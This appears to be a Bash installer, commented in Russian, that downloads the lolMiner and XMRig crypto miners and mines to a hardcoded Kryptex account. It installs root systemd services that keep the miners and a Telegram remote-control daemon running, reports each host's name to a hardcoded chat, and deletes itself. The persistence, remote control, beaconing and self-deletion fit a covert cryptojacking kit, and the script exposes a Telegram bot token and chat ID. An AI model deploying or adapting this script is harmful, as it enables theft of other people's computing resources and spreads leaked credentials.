#!/bin/bash

#==============================================================================
# ЯДРО - НЕ ТРОГАТЬ. ЭТОТ СКРИПT МЫСЛИТ И ПОДЧИНЯЕТСЯ.
#==============================================================================
# Режим работы (определяется автоматически)
ROOT_MODE=false
if [ "$(id -u)" -eq 0 ]; then
  ROOT_MODE=true
fi

# Пути установки (определяются автоматически)
if [ "$ROOT_MODE" = true ]; then
  INSTALL_DIR="/opt/mining"
  BIN_DIR="/usr/local/bin"
  LOG_DIR="/var/log"
else
  INSTALL_DIR="$HOME/mining"
  BIN_DIR="$HOME/.local/bin"
  LOG_DIR="$INSTALL_DIR/log"
fi

#==============================================================================
#==============================================================================
KRIPTEX_USERNAME="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg" # Твой токен от @BotFather
TELEGRAM_CHAT_ID="7032066912"                                   # Твой числовой ID чата
ETC_POOL="etc.kryptex.network:7033"
XMR_POOL="xmr.kryptex.network:7029"

#==============================================================================
# УМНЫЕ ФУНКЦИИ (ОСНОВА)
#==============================================================================

get_server_ip() {
    curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0"
}

SERVER_IP=$(get_server_ip)
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRIPTEX_USERNAME}.${WORKER_ID}"
ETC_USERNAME="$WORKER_NAME"
XMR_USERNAME="$WORKER_NAME"

send_telegram_message() {
    local message="$1"
    if [ "$ROOT_MODE" = false ]; then return 0; fi
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}" \
        -d "parse_mode=HTML" > /dev/null 2>&1
}

install_dependencies() {
    if [ "$ROOT_MODE" = true ]; then
        echo "[INFO] Режим Бога: Устанавливаю системные зависимости (wget, curl, cron, python3)..."
        apt-get install -y wget curl cron python3 >/dev/null || yum install -y wget curl cronie python3 >/dev/null
    else
        echo "[INFO] Режим Смертного: Проверка зависимостей..."
        ! command -v wget &> /dev/null && echo "[ERROR] wget не найден! Установи его." && exit 1
        ! command -v curl &> /dev/null && echo "[ERROR] curl не найден! Установи его." && exit 1
        ! command -v python3 &> /dev/null && echo "[ERROR] python3 не найден! Установи его. Он нужен для удаленного управления." && exit 1
    fi
}

install_miners() {
    echo "[INFO] Создаю каталоги в $INSTALL_DIR..."
    mkdir -p "$INSTALL_DIR/etc" "$INSTALL_DIR/xmr"
    if [ "$ROOT_MODE" = false ]; then mkdir -p "$LOG_DIR"; fi

    echo "[INFO] Устанавливаю lolMiner (ETC) в $INSTALL_DIR/etc..."
    wget -qO- https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz | tar -xz -C "$INSTALL_DIR/etc" --strip-components=1
    chmod +x "$INSTALL_DIR/etc/lolMiner"

    echo "[INFO] Устанавливаю XMRig (XMR) в $INSTALL_DIR/xmr..."
    wget -qO- https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz | tar -xz -C "$INSTALL_DIR/xmr" --strip-components=1
    chmod +x "$INSTALL_DIR/xmr/xmrig"

    echo "[OK] Майнеры загружены."
}

create_scripts() {
    echo "[INFO] Создаю скрипты запуска и утилиты управления в $BIN_DIR..."
    mkdir -p "$BIN_DIR"

    cat > "$INSTALL_DIR/etc/start.sh" << EOF
#!/bin/bash
cd "$INSTALL_DIR/etc"
./lolMiner --algo ETCHASH --pool $ETC_POOL --user $ETC_USERNAME --tls off --nocolor
EOF
    chmod +x "$INSTALL_DIR/etc/start.sh"

    cat > "$INSTALL_DIR/xmr/start.sh" << EOF
#!/bin/bash
cd "$INSTALL_DIR/xmr"
./xmrig -o $XMR_POOL -u $XMR_USERNAME -p x --randomx-1gb-pages
EOF
    chmod +x "$INSTALL_DIR/xmr/start.sh"

    cat > "$BIN_DIR/start-mining" << EOF
#!/bin/bash
echo "[INFO] Запускаю майнеры..."
nohup $INSTALL_DIR/etc/start.sh > $LOG_DIR/etc-miner.log 2>&1 &
nohup $INSTALL_DIR/xmr/start.sh > $LOG_DIR/xmr-miner.log 2>&1 &
sleep 1
echo "[OK] Майнеры запущены в фоновом режиме. Логи в $LOG_DIR"
send_telegram_message "[START] Майнеры на $(hostname) запущены."
EOF
    chmod +x "$BIN_DIR/start-mining"

    cat > "$BIN_DIR/stop-mining" << EOF
#!/bin/bash
echo "[INFO] Останавливаю майнеры..."
pkill -f "$INSTALL_DIR/etc/lolMiner"
pkill -f "$INSTALL_DIR/xmr/xmrig"
sleep 1
pkill -9 -f "$INSTALL_DIR/etc/lolMiner"
pkill -9 -f "$INSTALL_DIR/xmr/xmrig"
echo "[OK] Майнеры остановлены."
send_telegram_message "[STOP] Майнеры на $(hostname) остановлены."
EOF
    chmod +x "$BIN_DIR/stop-mining"

    cat > "$BIN_DIR/mining-status" << EOF
#!/bin/bash
echo "=== СТАТУС МАЙНЕРОВ ==="
pgrep -f "$INSTALL_DIR/etc/lolMiner" >/dev/null && echo "[OK] ETC Miner (GPU): ЗАПУЩЕН" || echo "[--] ETC Miner (GPU): ОСТАНОВЛЕН"
pgrep -f "$INSTALL_DIR/xmr/xmrig" >/dev/null && echo "[OK] XMR Miner (CPU): ЗАПУЩЕН" || echo "[--] XMR Miner (CPU): ОСТАНОВЛЕН"
echo " "
echo "=== ХЕШРЕЙТ (последние данные) ==="
ETC_H=\$(tail -20 $LOG_DIR/etc-miner.log 2>/dev/null | grep -o "Average speed:.*" | tail -1 | sed 's/Average speed: //')
XMR_H=\$(tail -20 $LOG_DIR/xmr-miner.log 2>/dev/null | grep -o "speed [0-9.]*" | tail -1)
echo "ETC: \${ETC_H:-нет данных}"
echo "XMR: \${XMR_H:-нет данных}"
echo " "
echo "Для полной информации смотри логи в $LOG_DIR"
EOF
    chmod +x "$BIN_DIR/mining-status"
}

setup_autostart() {
    if [ "$ROOT_MODE" = true ]; then
        echo "[INFO] Режим Бога: Настраиваю автозапуск майнеров через systemd..."
        cat > /etc/systemd/system/etc-miner.service << EOF
[Unit]
Description=ETC Mining Service
After=network.target
[Service]
Type=simple
ExecStart=$INSTALL_DIR/etc/start.sh
Restart=always
RestartSec=10
StandardOutput=append:$LOG_DIR/etc-miner.log
StandardError=append:$LOG_DIR/etc-miner.log
User=root
[Install]
WantedBy=multi-user.target
EOF
        cat > /etc/systemd/system/xmr-miner.service << EOF
[Unit]
Description=XMR Mining Service
After=network.target
[Service]
Type=simple
ExecStart=$INSTALL_DIR/xmr/start.sh
Restart=always
RestartSec=10
StandardOutput=append:$LOG_DIR/xmr-miner.log
StandardError=append:$LOG_DIR/xmr-miner.log
User=root
[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl enable etc-miner.service xmr-miner.service >/dev/null
        echo "[OK] Сервисы systemd для майнеров созданы и включены."
    else
        echo "[INFO] Режим Смертного: Для автозапуска майнеров добавь в crontab: @reboot $BIN_DIR/start-mining"
    fi
}

#--- НОВЫЙ БЛОК: УПРАВЛЕНИЕ ЧЕРЕЗ TELEGRAM ---

create_bot_script() {
    echo "[INFO] Создаю демона для управления через Telegram..."
    # 'Here document' для создания python-скрипта.
    # Обрати внимание, как я экранирую \` и \$ чтобы они попали в скрипт как текст, а не выполнились баш-оболочкой.
    cat > "$INSTALL_DIR/bot_control.py" << EOF
import os
import subprocess
import json
import time
from urllib.request import urlopen, Request
from urllib.parse import urlencode

# ==============================================================================
# КОНФИГУРАЦИЯ (ВНЕДРЕНА УСТАНОВЩИКОМ)
# ==============================================================================
BOT_TOKEN = "$TELEGRAM_BOT_TOKEN"
ALLOWED_CHAT_ID = $TELEGRAM_CHAT_ID
BIN_DIR = "$BIN_DIR"
# ==============================================================================

API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
HOSTNAME = os.popen("hostname").read().strip()

def send_message(chat_id, text):
    """Отправляет сообщение в указанный чат."""
    print(f"Отправка сообщения в {chat_id}: {text[:70]}...")
    try:
        params = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
        req = Request(f"{API_URL}/sendMessage", data=urlencode(params).encode())
        urlopen(req, timeout=10).read()
    except Exception as e:
        print(f"++ОШИБКА++ Не удалось отправить сообщение: {e}")

def run_command(command):
    """Выполняет команду и возвращает ее вывод."""
    full_path = os.path.join(BIN_DIR, command)
    print(f"Выполнение команды: {full_path}")
    try:
        result = subprocess.run(
            [full_path],
            capture_output=True,
            text=True,
            timeout=30,
            check=True
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return f"Команда завершилась с ошибкой:\n{e.stderr.strip()}"
    except Exception as e:
        return f"++КРИТИЧЕСКАЯ ОШИБКА++ при выполнении команды: {e}"

def main_loop():
    """Главный цикл демона: опрос API и обработка команд."""
    update_offset = 0
    print("Демон управления запущен. Ожидание команд...")
    send_message(ALLOWED_CHAT_ID, f"✅ *Демон управления запущен на хосте* \`{HOSTNAME}\`")

    while True:
        try:
            url = f"{API_URL}/getUpdates?offset={update_offset}&timeout=60"
            response = urlopen(url, timeout=70).read()
            updates = json.loads(response)

            for update in updates.get('result', []):
                update_offset = update['update_id'] + 1
                
                if 'message' not in update or 'text' not in update['message']:
                    continue

                message = update['message']
                chat_id = message['chat']['id']
                command_text = message['text'].strip().lower()

                if chat_id != ALLOWED_CHAT_ID:
                    print(f"Отклонен запрос от постороннего chat_id: {chat_id}")
                    continue

                print(f"Получена команда '{command_text}' от хозяина.")
                
                response_text = ""
                if command_text == '/status':
                    response_text = f"*Текущий статус на \`{HOSTNAME}\`:*\n\`\`\`\n{run_command('mining-status')}\n\`\`\`"
                elif command_text == '/restart':
                    send_message(chat_id, "⏳ Принято. Перезапускаю майнеры...")
                    run_command('stop-mining')
                    time.sleep(2)
                    start_output = run_command('start-mining')
                    response_text = f"✅ *Перезапуск на \`{HOSTNAME}\` завершен.*\n\`\`\`\n{start_output}\n\`\`\`"
                elif command_text == '/help':
                    response_text = f"Доступные команды для \`{HOSTNAME}\`:\n*/status* - проверить статус\n*/restart* - перезапустить"
                
                if response_text:
                    send_message(chat_id, response_text)

        except Exception as e:
            print(f"++ОШИБКА++ в главном цикле: {e}")
            time.sleep(15)

if __name__ == '__main__':
    time.sleep(5)
    main_loop()

EOF
    chmod +x "$INSTALL_DIR/bot_control.py"
    echo "[OK] Демон управления создан в $INSTALL_DIR/bot_control.py"
}

setup_bot_service() {
    if [ ! -f "$INSTALL_DIR/bot_control.py" ]; then
        echo "[WARN] Скрипт демона не найден, пропускаю настройку автозапуска."
        return
    fi

    if [ "$ROOT_MODE" = true ]; then
        echo "[INFO] Режим Бога: Настраиваю автозапуск демона через systemd..."
        cat > /etc/systemd/system/mining-bot.service << EOF
[Unit]
Description=Mining Control Telegram Bot
After=network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 $INSTALL_DIR/bot_control.py
Restart=always
RestartSec=15
User=root
[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload
        systemctl enable mining-bot.service >/dev/null
        systemctl restart mining-bot.service
        echo "[OK] Сервис systemd для демона (mining-bot) создан, включен и запущен."
    else
        echo "[INFO] Режим Смертного: Для автозапуска демона добавь в crontab: @reboot nohup python3 $INSTALL_DIR/bot_control.py > $LOG_DIR/bot.log 2>&1 &"
    fi
}

#==============================================================================
# ГЛАВНЫЙ ПОТОК ВЫПОЛНЕНИЯ
#==============================================================================
main() {
    echo "======================================================================="
    if [ "$ROOT_MODE" = true ]; then echo "  РЕЖИМ БОГА АКТИВИРОВАН (установка с правами root)"; else echo "  РЕЖИМ СМЕРТНОГО (локальная установка без root)"; fi
    echo "======================================================================="
    
    send_telegram_message "[INSTALL] Начало установки на $(hostname) (режим: $ROOT_MODE)"

    install_dependencies
    install_miners
    create_scripts
    setup_autostart
    create_bot_script
    setup_bot_service

    echo ""
    echo "======================================================================="
    echo "  [OK] НАСТРОЙКА ЗАВЕРШЕНА!"
    echo "======================================================================="
    echo ""

    if [ "$ROOT_MODE" = false ]; then
        if [[ ":$PATH:" != *":$HOME/.local/bin:"* ]]; then
            echo "[WARN] Каталог $HOME/.local/bin не найден в твоем PATH."
            echo "[INFO] Чтобы команды были доступны, добавь в свой .bashrc или .zshrc:"
            echo '  export PATH="$HOME/.local/bin:$PATH"'
            echo "[INFO] А затем выполни: source ~/.bashrc (или ~/.zshrc)"
        fi
    fi

    echo "ЗАПУСКАЮ МАЙНЕРЫ В ПЕРВЫЙ РАЗ..."
    "$BIN_DIR/stop-mining" >/dev/null 2>&1
    sleep 2
    "$BIN_DIR/start-mining"

    echo ""
    echo "======================================================================="
    echo "  КОМАНДЫ УПРАВЛЕНИЯ:"
    echo "    start-mining     - запустить майнеры"
    echo "    stop-mining      - остановить майнеры"
    echo "    mining-status    - проверить статус"
    echo ""
    echo "  УПРАВЛЕНИЕ ЧЕРЕЗ TELEGRAM:"
    echo "    Отправь боту /help для списка команд"
    echo "======================================================================="
    
    send_telegram_message "[SUCCESS] Установка на $(hostname) завершена. Система под контролем."
    
    echo "[INFO] Самоуничтожение скрипта установщика..."
    rm -f -- "$0"
}

main "$@"
